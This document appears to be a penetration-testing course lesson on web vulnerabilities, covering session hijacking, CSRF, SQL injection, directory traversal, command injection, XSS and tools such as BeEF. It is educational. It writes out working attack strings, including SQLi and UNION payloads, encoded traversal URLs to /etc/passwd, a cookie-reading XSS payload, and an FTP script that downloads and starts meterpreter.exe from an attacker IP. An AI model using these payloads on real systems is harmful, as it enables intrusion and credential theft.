## Lesson Introduction
---
Web applications are widely used but are vulnerable to many different types of attacks. The OWASP Top Ten vulnerabilities list helps guide the PenTest by providing details on common vulnerabilities that exist in web applications. As a result, the PenTest team should assess the web applications for various web vulnerabilities that include session, application programming interface (API), and injection attacks. To achieve this goal, the PenTest team has several tools available to them, such as SearchSploit and WPScan, a WordPress security scanner.

## Lesson Objectives
---
In this lesson, you will:

- Describe some of the web vulnerabilities that exist and state the significance of the OWASP Top Ten vulnerabilities.
- Compare session attacks such as session hijacking and Cross-site request forgery (CSRF) along with attacks on Application Programming Interface (API) endpoints.
- Summarize injection attacks that include Structured Query Language (SQL) injection, Blind and Boolean SQL attacks, along with other attacks such as cross-site scripting.
- Recognize tools used to test web applications such as SearchSploit, WP scan, and brakeman and be able to briefly outline some of the main functions of each tool.

## Topic 13A - Recognizing Web Vulnerabilities
---
> [!note] Exam Objectives Covered
> *3.3 Given a scenario, research attack vectors and perform application-based attacks.*
> *3.5 Explain common attacks and vulnerabilities against specialized systems.*

Web applications (apps) interact with many different users at the same time over a network and the internet, and as such, must be easily accessible to a large number of people. This accessibility gives attackers an easy target and allows them to try and manipulate the various components of web applications in order to attack web sites and the applications.

Typically, attackers are trying to steal sensitive data, compromise other users' sessions, disrupt the applications operation, or gain a foothold within the company.

Web apps communicate in common languages for compatibility with the HTTP/S protocol and the browsers that enable users to interact with websites. Most apps, even if they run on a web framework like AngularJS, Ruby on Rails, Django (Python), etc., will still incorporate HTML and JavaScript code.

In addition, most apps require reading from and writing to a database. Structured Query Language (SQL) is the most common querying language to enable this functionality.

When you add all of these components together, you tend to encounter familiar and repeated vulnerabilities. In general, vulnerabilities include:

- Poorly implemented or non-existent security configurations.
- Failings in authentication and authorization components.
- The potential for various types of code injection attacks

In order to cover these common vulnerabilities for both developers and PenTesters, a good starting point to consider is the OWASP Top Ten ( [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/) ).

> [!warning] Note: Base64 is a popular encoding scheme on the web that converts binary data into an ASCII string format, and should be taken into consideration with several attacks outlined below.

### Outlining The OWASP Top 10
---
The Open Web Application Security Project (OWASP) was created to improve software security. It is a nonprofit foundation formed in 2001 but became a US nonprofit charity in April 2004.

OWASP has free documents, forums, and chapters but is most famous for the OWASP Top Ten. The OWASP Top Ten is a document for developers and web application security.

Its purpose is to raise awareness on what are viewed as the most relevant critical security risks to web applications:

A1:2021-Broken Access Control  
A2:2021-Cryptographic Failures  
A3:2021-Injection  
A4:2021-Insecure Design  
A5:2021-Security Misconfiguration  
A6:2021-Vulnerable and Outdated Components  
A7:2021-Identification and Authentication Failures  
A8:2021-Software and Data Integrity Failures  
A9:2021-Security Logging and Monitoring Failures  
A10:2021-Server-Side Request Forgery (SSRF)

> [!warning] The one constant we have in PenTesting is change. Attack surfaces and attack methods, as well as defenses, are constantly evolving and changing. The OWASP Top 10 was updated in 2021, reflecting these changes and the latest in web application security risks. Check the website ([https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)) frequently to ensure you have the most up-to-date information.


![[Pasted image 20240618080603.png]]
*OWASP Top 10 Category Mapping*

Some of the attack methods that you will see next are possible due to these common threats.

### Exposing Sensitive Data
---
Data transmission should be kept secure for web resources but implementations in security measurements are sometimes not straightforward and may leave gaps that can be leveraged. This can be noted in the OWASP Top Ten as A6:2017-Security Misconfiguration.

Other times something that was not considered important was left unsecured, even if it is just technical information. This could provide the attacker with further details to research and other vectors to analyze and possibly exploit, as seen in the next item.

### Improperly Handling Errors
---
Developers may add code to handle errors, ensure continuity, and provide informative error output. Error output can provide the penetration testing team with key details they need to proceed, such as information about the underlying technology. Other times the error contains references to the location of files related to the web application (see A3:2017-Sensitive Data Exposure).

Indeed, revealing too much in an error can be a problem but not handling errors at all is an even bigger problem. For example, an app may not respond gracefully to unexpected input. This can sometimes be leveraged by the PenTester, but it can also lead to crashing the app or corrupting data.

### Missing Input Validation
---
This happens when user-supplied data is processed by the web application without first performing the tasks required to mitigate attacks. These types of vulnerabilities lead to injection attacks, which are the first items addressed by the OWASP Top Ten: 10:2021 ([https://owasp.org/Top10/](https://owasp.org/Top10/)).

> [!warning] When feasible, the most effective way to defeat injection attacks is ***input whitelisting***.

### Signing and Code Verifying
---
In order to determine that a script or executable has not been tampered with, it can be digitally signed. From a technical perspective, some implementations work similarly to websites over secure HTTP: they use a private and a public certificate pair (commonly referred to as keys). In the case of ***code signing***, the private key is usually associated with the developer that created the script or executable.

The lack of this process _could_ indicate that it is not being accounted for and the penetration test may succeed if the adversary alters these files to gain additional access. For example, if an internal server was using a PowerShell script to access information, the tester currently cannot, and doesn’t want to, raise suspicion by attempting to access the server directly. They could, however, add a line of code to the script so that the server will relay the relevant information to them once it has collected it. <mark style="background: #FFF3A3A6;">Do note, however, that there are other methods available beyond code signing to determine whether a file has been tampered with. For instance, obtaining and storing the hash of the file would suffice because any change within it would result in a different hash.</mark>

### Causing A Race Condition
---
These occur when the resulting outcome from execution processes is directly dependent on the order and timing of certain events. Issues arise if these events fail to execute in the order and timing intended by the developer.

For example, an app can check that a file exists and then use it later. You may be able to replace the file after it is checked by the app but not yet used. This can trigger app instability or privilege escalation.

> [!warning] A **Time-of-check-to-time-of-use (TOCTTOU or TOC/TOU)** attack is a notable example of a race condition exploit. This issue occurs when a program checks access permissions too far in advance of a resource request.
> 
## Topic 13B - Launch Session Attacks
---
> [!note] Exam Objectives Covered
> *3.3 Given a scenario, research attack vectors and perform application-based attacks.*
> *3.7 Given a scenario, perform post-exploitation techniques.*

There are many types of attacks that can be implemented against web applications, including session attacks, cross-site request forgery attacks, and privilege escalation attacks. Many clients do not properly secure their environments against these types of attack. In this topic, you will explore more details about these attacks.
<font style="color: red">VIDEO NEEDED</font>

### Hijacking Session Credentials
---
***Session hijacking*** is the process of stealing the session credential from a user's browser and then using it to impersonate the user on a website. HTTP has no mechanism at the protocol level for tracking the state of a particular browser request.

From the server's perspective, every request it receives from the client is new. If authentication is required, the user must either re-enter credentials for every new request, or some other mechanism must exist to tie all requests into a single continuous session. The most common mechanism for doing this is a cookie.

A ***cookie*** is a text file that the server gives to the client browser. It contains the session ID (SID) for that particular web session and is used as an authentication token. The browser keeps presenting the cookie every time a request is made. In this way, the user does not need to keep re-entering credentials at the website.

Impersonation through session hijacking could be achieved, for example, when you exploit a browser vulnerability and have access to the browser’s cookies, with its contents such as SID. If you can steal the victim's SID, you can put it in your own cookie and use it.

Alternatively, if you know a particular session ID, such as the one generated when you connect to the website (even before authentication), and the user were to authenticate with it, you will already have a valid SID to access the web application with the same permissions as the user.

***Session fixation*** requires the user to authenticate with a known session identifier that will then be used for impersonation. As an example, this could be done through social engineering and providing a fake login page that will use the known SID.

***Session replay*** requires having access to the user authentication process itself, so that it can be intercepted and repeated. This could be achieved through a man-in-the-middle attack.

> [!warning] _For more information on session attacks and mitigation strategies, see_ [_https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Session_Management_Cheat_Sheet.md_](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Session_Management_Cheat_Sheet.md) _._


### Crafting Request Forgery Attacks
---
In a ***cross-site request forgery (XSRF/CSRF)*** attack, an attacker takes advantage of the trust established between an authorized user of a website and the website itself. For example, this type of attack could leverage a web browser's trust in a user's unexpired browser cookies.

You can take advantage of the saved authentication data stored inside the cookie to gain access to a web browser's sensitive data. This concept is closely related to the session attacks we just saw, hence why it is sometimes referred to as "session riding." It is also nicknamed the "one-click-attack," and here is a simple example of why:

Consider that the target page has a login form with a Remember Me check box. This is common functionality in web apps because it saves users from the hassle of having to enter their credentials every time that they log in. Instead, the saved cookie will authenticate them whenever they next access the site. You can exploit this trust and leverage the user's privileges with the app.

For example, say that the user logs into an online storefront and has checked the Remember Me option. They add some items to their shopping cart but then log out and go on to something else. You examine the site and notice that when you sign in with your own account, you have the ability to issue a request using several parameters that increase the quantity of an item in the shopping cart. You craft a URL such as the following and send it to the victim:

`http://site.example/cart?cartID=1&add_quant=5`

When the victim clicks the link, they automatically sign into the site due to their saved cookie, and the requested action will execute. In other words, the quantity of the first item in the shopping cart will increase by five, and the victim may not even be aware of it.

The power of CSRF comes from the fact that it is extremely difficult to detect since the attack is carried out by the user's browser just as it normally would be if the user made the request themselves. The user could enter that same URL manually and get the same result. It is almost impossible for the browser to distinguish a successful CSRF attack from normal user activity.

At the same time, pulling off a CSRF attack can itself be difficult because it requires finding the right combination of a form that can actually do something malicious and whose values are known and not obfuscated in some way. Likewise, sites that check the referrer header will likely disallow requests that originate from outside the domain.

Now, imagine that the user in our previous example is a server, and the target is either the resources that the server can access or the server itself. You now have a server-side request forgery attack.

In a ***server-side request forgery (SSRF)*** attack an attacker takes advantage of the trust established between the server and the resources it can access, including itself. Notably, if we are dealing with an internet-facing web application, successfully executing an SSRF attack may provide access to some internal resources that are otherwise unavailable to us.

> [!note] Related labs: https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf


### Escalating Privilege 
---
One of the many features that are common in web applications is per-user access. This is in terms of permissions that the user has within the application and what files, scripts, and databases they may access. For the purposes of performing a penetration test, having access to these resources will likely require privilege escalation (or simply PrivEsc).

There are two important ways in which this is performed that need to be taken into consideration:

***Horizontal Privilege Escalation*** <mark style="background: #FFF3A3A6;"> is obtaining access to a regular user account with different access or permissions than the one currently in use. This approach has great potential for information gathering without raising possible suspicion, as irregular user activity is more likely to stay unnoticed than irregular admin activity.
</mark>
***Vertical Privilege Escalation*** <mark style="background: #FFF3A3A6;">is obtaining access to an account of higher privilege than the one we currently have to enable resources that the regular user does not have permission for. In some cases we will need vertical PrivEsc, such as when we want to upgrade a “restrictive shell.”</mark>

### Upgrading a Non-Interactive Shell
---
There are cases in which the shell we obtain is limited in use. For example, after running an exploit that opens Netcat, we may note that, unlike regular shells, some elements are missing: pressing the UP arrow key does not display prior entered commands; when pressing TAB, the command does not auto-complete; or certain tools do not properly display their output. In these cases, we are facing a non-interactive shell, but there are workarounds.

In Windows, for example, we could create a text file with the lines necessary to launch FTP with it as a script and download Meterpreter from the attacker machine:

```
echo open 192.168.0.101 21 > ftp.txt
echo user >> ftp.txt
echo pass >> ftp.txt
echo binary >> ftp.txt
echo GET meterpreter.exe >>ftp.txt
echo quit >>ftp.txt
ftp -s:ftp.txt
start meterpreter.exe
This will connect to X on port 21
```

This will connect to X on port 21, provide “user” as the username and “pass” as the password, set binary mode for file transfer, and download meterpreter.exe.

There are different methods to upgrade a non-interactive shell to an interactive one. To solve this in Linux, depending on distribution and implementation, it can be as simple as launching bash in interactive mode:
`/bin/bash -i`

### Exploiting Business Logic Flaws
---
***Business logic flaws*** are vulnerabilities that arise from implementation and design issues that lead to unintended behavior. This can be, for example, a poorly implemented method to lock accounts after successive failures to authenticate. If the system fails to lock the account, an attacker might take advantage of this in order to crack passwords by simply employing brute-force. Some of the most common types of services that are exploited due to business logic flaws are APIs.

Application programming interfaces (APIs) are standards for structured machine-to-machine communication. This is frequently used for automation to systematically query a server for particular data, and other similar tasks. If designed or employed incorrectly, they can open the door for an attacker.

Some of the most common APIs include:

- RESTful: API based on REST (Representational state transfer)
- XML-RPC: Extensible Markup Language-Remote Procedure Call
- SOAP: Simple Object Access Protocol

For example, XML-RPC is frequently targeted, and some common cases include an incorrectly secured implementation of it included in WordPress.

The following image shows the results from searching for XML-RPC exploits in a tool called SearchSploit (see topic D - Identify Tools):
![[Pasted image 20240611105918.png]]
*Sample search of XML-RPC exploits using SearchSploit*

## Topic 13C - Plan Injection Attacks
---
> [!note] Exam Objectives Covered
> *2.2 Given a scenario, perform active reconnaissance*
> *3.3 Given a scenario, research attack vectors and perform application-based attacks.*
> *3.5 Explain common attacks and vulnerabilities against specialized systems.*
> 

Most websites today are built using web applications. These are prime targets for attack. Two of the most common types of attacks used against web applications are code injection and directory traversal. In this topic, you will explore these attacks and some variations of them.

### Identifying SQLi Vulnerabilities
---
One of the most common type of code injection is ***SQL injection***. In a SQL injection (SQLi) attack, you can modify one, or more, of the four basic functions of SQL querying (selecting, inserting, deleting, and updating) by embedding code in some input within the web app, causing it to execute your own set of queries using SQL.

To identify SQL injection vulnerabilities in a web app, you should test every single input to include elements such as URL parameters, form fields, cookies, POST data, and HTTP headers.

<mark style="background: #FFF3A3A6;">The simplest and most common method for identifying possible SQL injection vulnerabilities in a web app is to submit a single apostrophe and then look for errors. This is called the</mark> **single quote method**. If an error is returned, you can see if it provides you with SQL syntax details that can then be used to construct a more effective SQL injection query.

To see this in action, consider the following SQL query that selects a username and password from the database:

`SELECT * FROM users WHERE username = 'Bob' AND password 'Pa22w0rd'`

In the username field of the login form, you insert an apostrophe and select the submit button. Without proper input validation, the SQL query might be submitted as:

`SELECT * FROM users WHERE username = ''' AND password 'Pa22w0rd'`

Because the apostrophe is not a valid input for the **username** field, the server may respond with an error and reveal its query format or other useful information about the database, including column names. The response might also reveal where you can inject opening or closing parentheses into the query to properly complete its syntax.

Another way to execute a syntactically correct query is to use a value that is always true, such as **1=1**, and then use the built-in capability to insert inline comments within the query by inputting the **--** characters. SQL will ignore anything following these comment characters. So to put it together, you enter the string **' or 1=1--** into the username field. The SQL query is as follows:

`SELECT * FROM users WHERE username = '' or 1=1--' AND password 'Pa22w0rd'`

The SQL syntax is now correct, and the database will not return an error if this SQL statement is sent to it. Instead, the database will return all user rows since the **1=1** statement is always true. Everything after the **--** comment characters will not execute.

Certain web app APIs also allow you to stack multiple queries within the same call. This can be useful for injecting new query types into a form's existing query type. For example, SQL has a UNION operator that combines the results of two or more SELECT statements. You can use this operator to obtain data from other tables that might not be directly exposed by the app.

For example, let's say you have a product search form that you've probed for SQL injection weaknesses. You could perform the following query on the search form to try to merge the **users** table with the **products** table, looking for the first two values from **users**:

`UNION SELECT '1', '2' FROM users—`

However, UNION operations only work when both queries (i.e., the initial SELECT from **products** and the UNION SELECT from **users**) have the same number of columns. So if the **products** table has five columns, you need to adjust your injection to include them:

`UNION SELECT '1', '2', '3', '4', '5' FROM users—`

These queries are using placeholder values, whereas you may need to provide the actual column names of the table you're trying to merge. For example, you might want to display the **username** and **password** columns:

`UNION SELECT '1', username, password, '4', '5' FROM users—`

This will merge the username and password fields of each row of the **users** table into the search page, replacing the second and third columns with the credentials.

> [!important] UNION-based SQL Injection Command
> An example of a UNION-based SQL injection attack can be done with SQLmap, as shown here: `./sqlmap.py -u "https://example.com/article&id=1" --technique=U`


There are cases where some techniques will not work, since they rely on the information displayed by the web application. ***Blind SQL injection*** is injecting SQL when the web application’s response does not contain the result of the query. An example would be: 

`Victor' AND 1=2;--`

A simple test to perform when you suspect that a web application is susceptible to Blind SQLi would be to try to separate times with values that are always true ('1=1') and false ('1=2') in your queries and see if anything changes in the web application’s response. This is known as ***Boolean-based blind SQLi***. Alternatively, adding a time delay to your SQL query is known as ***time-based blind SQLi*** :

`WAITFOR DELAY '0:0:05'`

### Traversing Files Using Invalid Input
---
***Directory traversal*** is the practice of accessing a file from a location that the user is not authorized to access. You can do this by inducing a web app to backtrack through the directory path so that the app reads or executes a file in a parent directory. The most simple example of directory traversal involves sending a **..\** or **../** command request to the application or API, which then traverses up one parent directory for each one of these commands.

Directory traversal is the most effective when you're able to traverse all the way back to the root to execute basically any command or program in any folder on the computer. However, this will only work if the application has been improperly configured to be able to access such folders.

Properly configured web servers will filter out known untrusted input like the directory traversal character set. The filter may handle the input in some way or simply block the request altogether. However, you may be able to bypass these filters by encoding characters in your requests in hexadecimal. For example, **%2E** is equivalent to **.** (period) and **%2F** is equivalent to **/** (slash). So instead of navigating to:

`http://site.example/../../Windows/system32/cmd.exe`

to access a command shell on a Windows server, you could encode the URL as follows:

`http://site.example/%2E%2E%2F%2E%2E%2FWindows/system32/cmd.exe`

You can even double encode characters to get around filters that account for simple encoding. For example, you can encode the **%** symbol itself, which is **%25** in hexadecimal. So instead of **%2E** for a period, it would be **%252E** . The full example would then change to the following:

`http://site.example/%252E%252E%252F%252E%252E%252FWindows/system32/cmd.exe`

A null byte is a character with a value of zero that is used in most programming languages to indicate the termination of a string. With a poison null byte, you can use this termination character to exploit a web app that does not properly handle null terminators. The hexadecimal representation of the poison null byte is **%00**. The poison null byte can support several different attacks, including directory traversal.

For example, assume that the web app enables users to retrieve any file in the **/var/www** directory that has a `.php` extension and nothing else. Even if you can traverse the file system to break out of that directory, you may not be able to access a specific file if it doesn't end in `.php`. The poison null byte, however, can get around this:

`http://site.example/page.php?file=../../etc/passwd%00`

This indicates to the web app to drop the `.php` extension that it otherwise expects, enabling you to retrieve the `passwd` file.

> [!warning] Know the terms: Local File Inclusion (LFI) and Remote File Inclusion (RFI). Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. Remote File Inclusion is an attack technique in which attacker includes remote files from other systems. 

Local File Inclusion example: 
`http://www.mycompany.com/sortusers.php?=c:/uploads/attack.exe`


### Injecting Code
---
***Code injection*** is an attack that introduces malicious code into a vulnerable application to compromise the security of that application. This is made possible by weak or completely absent input processing routines in the app. Injection attacks enable you to compromise an app in many ways, including:
- Causing a denial of service (DoS) of the app
- Escalating access privileges in the app
- Exposing and exfiltrating sensitive data in databases such as user credentials and PII
- Installing malicious software on the server hosting the app
- Defacing a website

The mechanisms and outcomes of a code injection attack will depend on the language that your malicious code is written in.<mark style="background: #FF5582A6;"> Since in a code injection attack you are not introducing new runtime environments for the server to execute, you'll be restricted to whatever languages the underlying web app technology supports.</mark> In other words, you are adding to the app's execution not creating new execution.

A similar concept is ***command injection***, in which you supply malicious input to the web server, which then passes this input to a system shell for execution. In this sense, command injection _does_ create new instances of execution and can, therefore, leverage languages that the web app does not directly support (e.g., Bash scripting).

In the following example, a PHP module named `delete_file.php` passes in user-supplied input and calls a Linux system shell to delete whatever was specified in the input:
`
``<?php $file=$_GET['file_name']; system('rm $file'); ?>`

By submitting the following request, you can successfully enumerate the system's user accounts:

`http://site.example/delete_file.php?$file_name=test.txt;cat%20/etc/passwd`

This is because adding a semicolon at the end of the request will execute the command _after_ the semicolon in the system shell. Note that **%20** is the encoded version of a space because URLs cannot contain spaces.

Some of these vulnerabilities are prevalent in smaller networked systems with low security, such as Internet-of-Things (IoT) devices. At the same time, their simplicity and convenience also make them proliferate in networks, to the point of controlling key elements. This can pose an opportunity for an attacker, even in cases where the device is only used for readings or measurements on which further actions are taken.

In regard to data analysis and automation, IoT data corruption refers to faults in the information transmitted, stored, or otherwise managed by IoT devices. For the purposes of a penetration test, it could translate into covering tracks by deleting entries from an access device or help retrieving sensitive information through less conspicuous channels to avoid detection. This last example is known as data exfiltration

The Lightweight Directory Access Protocol (LDAP) is a standard for networked devices on how to manage directory services. It can be used by web applications to perform tasks according to user input, so it is a possible location to attempt injection. The techniques employed look similar to SQL injection:

`x' or name()='username' or 'x'='y`

### Executing XSS Attacks
---
A ***cross-site scripting (XSS)*** attack is an attack which injects JavaScript that executes on the client's browser. The client's browser is unable to tell that the script is untrusted and will allow it to execute.

Malicious JavaScript can compromise a client by more than just changing the contents of a page. It can be used to steal session cookies, read sensitive information, and inject malware that can execute outside the browser on the user's computer. XSS is one of the most popular and effective web app exploits and is made possible by poor input validation.

There are actually three different categories of XSS:

- In a persistent attack, also called a stored attack, you inject malicious code or links into a website's forums, databases, or other data. When a user views the stored malicious code, or clicks a malicious link on the site, the attack is perpetrated against them. As the name suggests, the injected code remains in the page because it is stored on the server.
- In a reflected attack, you craft a form or other request to be sent to a legitimate web server. This request includes your malicious script. You then send a link to the victim with this request and when the victim clicks that link, the malicious script is sent to the legitimate server and reflected off it. The script then executes on the victim's browser. Unlike a stored attack, the malicious code in a reflected attack does not persist on the server.
- In a Document Object Model (DOM)-based attack, malicious scripts are not sent to the server at all, rather, they take advantage of a web app's client-side implementation of JavaScript to execute the attack solely on the client.

> [!warning] On Third-Party Hosted Services: Even when you have permission to test, if the web application you are targeting belongs to an external organization (i.e.: Cloud), a persistent attack may impact users who are significantly outside of your scope.

As with other injection attacks, you should probe input components in the web app for XSS vulnerabilities. The most basic example is finding a form such as a search field, comments field, username/password form, etc., and injecting the following script to open a pop-up on the client's browser:
```
<script>alert("Got you!")</script>
POST http://site.example/products Content-Type: application/json {"name": "row", "description": "<script>alert(document.cookie)</script>", "price": 9.99}
```

Assuming you've obtained authorization (if any is needed), this adds a new row in the **products** table. The **description** entry will always trigger an alert on a page that displays this particular row. In this case, the alert will return the user's cookie information.

In most cases, this will reflect off the server and only appear in a single response to the client. So, you'll need to craft a URL to send a victim to:

`http://site.example/?search=<script>alert("XSS%20attack!")<%2Fscript>`

Crafting a persistent attack will require you to modify the data stored in the web app. You can try to do this with forms that you know store data, like the aforementioned site feedback page. However, some injection points might not be so visible.

Using the product search example, you'd need to actually change the values of the **products** table itself, rather than just injecting a script into the search results. Depending on the web app's underlying technology, you may be able to change table data by POSTing content in an HTTP request. For example:

`POST http://site.example/products Content-Type: application/json {"name": "row", "description": "<script>alert(document.cookie)</script>", "price": 9.99}`

### Providing Responses via a Web Proxy
---
A web proxy server will help protect you from attacks. If the customer is using a web proxy, you need to adjust your PenTest accordingly.

The proxy will be an intermediary between the client that makes the requests and the server providing the responses. The proxy is any machine that translates traffic. Instead of sending data straight out to the internet, a proxy can be configured to receive your web requests and forward them for you.

If you’re using a proxy server, traffic flows through the proxy server on its way out and back in again.

Modern proxy servers do more than just forward web requests: advanced proxy servers today can include firewall and web filters, along with web caching.

A proxy server can keep you safe from many threats. They can provide a high level of security and privacy.

## Topic 13D - Identify Tools
---
> [!note] Exam Objectives Covered
> *3.3 Given a scenario, research attack vectors and perform application-based attacks.*
> *3.6 Given a scenario, perform a social engineering or physical attack.*
> *5.3 Explain use cases of the following tools during the phases of a penetration test.*

In this topic, we will cover some of the tools that can aid the penetration testing team with investigating web application-based attacks, such as the ones discussed in the previous topics. There are different important areas to cover in order to find vulnerabilities and successfully exploit them.
<font style="color: red">VIDEO NEEDED</font>

### Overview of Tools
---
These tools range from simple vulnerability scanners for a particular web application to credential lookup tools and proxies that allow you to manipulate and fine-tune requests:

|               **Tool**                | **Description**                                                                                                                                                                                                                                                                 |
| :-----------------------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|              truffleHog               | Git secrets search tool. It can automatically crawl through a repository looking for accidental <br>commits of secrets. GitHub secrets allow code commits, this will allow an attacker to modify code in a repository.                                                          |
|    OWASP ZAP<br>(Zed Attack Proxy)    | Proxy that allows for both automated and manual testing and identification of vulnerabilities. <br>It has many components that allow for different tasks to be performed.                                                                                                       |
|     Burp Suite Community Edition      | Proxy with a wide range of options to test web applications for different vulnerabilities. <br>Its components allow you to perform particular types of automated testing, manually <br>modifying requests, and passive analysis.                                                |
|               Gobuster                | Can discover subdomains, directories, and files by brute-forcing from a list of common names. <br>This can provide information that was otherwise not available.                                                                                                                |
|               DirBuster               | Web application brute-force finder for directories and files. Comes with 9 different lists, including default <br>directories and common names given by developers. Also allows for brute-force.                                                                                |
|                 w3af                  | The Web Application Attack and Audit Framework allows you to identify and exploit a large set of web-based <br>vulnerabilities, such as SQL injection and cross-site scripting.                                                                                                 |
|                Wapiti                 | A web application vulnerability scanner which will automatically navigate a webapp looking for <br>areas where it can inject data. Several modules can be enabled/disabled to target different vulnerabilities.                                                                 |
| BeEF (Browser Exploitation Framework) | Focuses on web browser attacks by assessing the actual security posture of a target by using client-side <br>attack vectors.                                                                                                                                                    |
|  WPScan (WordPress Security Scanner)  | Automatically gathers data about a WordPress site and compares findings such as plugins against a database <br>of known vulnerabilities. Provides useful information on findings, including plugin version and references to the <br>vulnerability such as CVE number and link. |
|               Brakeman                | Static code analysis security tool for Ruby on Rails applications. Checks for vulnerabilities <br>and provides confidence level of finding (high, medium, weak).                                                                                                                |
|                SQLmap                 | SQL Injection scanner tool. Automates several of the attacks and supports many databases. <br>Some of its features include database search, enumeration, and command execution.                                                                                                 |
|             SearchSploit              | Exploit finder that allows to search through the information found in Exploit-DB. <br>It also supports Nmap outputs in XML format to search for exploits automatically.                                                                                                         |
|             CrackMapExec              | Post-exploitation tool to identify vulnerabilities in active directory environments.                                                                                                                                                                                            |

### Exploiting a Browser with BeEF
---
The Browser Exploit Framework (or simply “BeEF”) is a tool designed to exploit some functionality or vulnerability within a browser to launch XSS and injection attacks against a website. The goal is to gain access, gather information, use a proxy, and other utilities for the PenTester.

Because web browsers need internet access to function, they are a common target for gaining initial access. Numerous browser attacks require social engineering and user interaction to get a foothold in the web page, so that commands can be executed without the victim noticing anything different. One method to gain control is by hooking a browser, which connects a browser to another device, usually an attacker’s tool or framework, to execute further attacks. With BeEF, you can ‘ **hook** ’ a browser quite easily, using a standard JavaScript file included within the framework.

Once in BeEF’s main window, on the left side you will see a list of Hooked Browsers. Within this section, there are typically two folders displayed: online and offline as described:

- **Online** informs you that the device is available and awaiting instructions.
- **Offline** informs you that the device is not ready.

If you select an IP address of one of the hooked browsers, BeEF will provide some basic information, such as:

- Web browser
- Operating system
- Hardware type (if known)
- Location (if known)

In addition, once an IP address is selected, you will see several tabs in the right-hand side of the screen, such as Details, Logs, and Commands. Selecting Commands will provide a way to execute a variety of modules that you can use to gather further information about the device. Modules include:

- Type of browser in use
- Use as a proxy
- Get Internal IP address

The framework is intuitive, as when you are in the command area, BeEF will indicate which modules will work against the target by using different colors as follows:

- **Green** - The command module works against the target and should be invisible to the user
- **Gray** - The command module works against the target but may be visible to the user
- **Orange** - The command module is yet to be verified against this target
- **Red** - The command module does not work against this target
